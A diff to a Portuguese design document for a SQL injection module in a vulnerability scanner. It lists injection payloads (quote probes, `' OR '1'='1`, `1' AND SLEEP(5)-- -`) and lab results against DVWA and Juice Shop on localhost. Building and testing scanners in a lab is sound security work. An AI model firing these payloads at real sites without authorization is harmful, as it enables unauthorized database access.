@@ -30,7 +30,8 @@ continua manual (navegador); o scanner só repassa os headers.
 - `src/main/resources/payloads/sqli.txt` (vai no jar). Uma linha por payload:
   `id<TAB>valor<TAB>descrição`. Linhas vazias e começadas por `#` são ignoradas.
 - Payloads, na ordem de execução (rápidos primeiro, temporal por último):
-  - aspas: `sqli-quote-single` (`'`), `sqli-quote-double` (`"`);
+  - aspas: `sqli-quote-single` (`1'`), `sqli-quote-double` (`1"`). Com prefixo: no Juice
+    Shop `'` sozinho não gera erro, mas `1'` gera `SQLITE_ERROR` (verificado no lab);
   - booleano: `sqli-bool-or-true` (`' OR '1'='1`), `sqli-bool-or-comment` (`1' OR 1=1-- -`);
   - temporal (prefixo `sqli-time-`, convenção da #9): `sqli-time-mysql-sleep`
     (`1' AND SLEEP(5)-- -`).
@@ -101,4 +102,12 @@ continua manual (navegador); o scanner só repassa os headers.
 7. **Checkpoint manual (laboratório)**: com DVWA em `:8080`, logado e `security=low`,
    `java -jar target/vulnscan.jar scan --target http://localhost:8080 --module sqli
    --header "Cookie: PHPSESSID=<sessão>; security=low"` gera `report.md` com o achado e a
-   evidência. Não roda neste container (sem daemon Docker); fica para execução local.
+   evidência. Também `--target http://localhost:3000` (Juice Shop, SQLite).
+
+## Verificado no laboratório (2026-11-04, antes de implementar)
+
+- DVWA `security=low`, logado: `id=1'` → 200 com `You have an error in your SQL syntax;
+  ... MariaDB server version`; `id=1' AND SLEEP(5)-- -` → 5,0 s; `' OR '1'='1` lista todos
+  os usuários (sem erro: a heurística não acusa).
+- Juice Shop `/rest/products/search`: `q='` → 200 sem erro; `q=test'` → 500 com
+  `SQLITE_ERROR`.
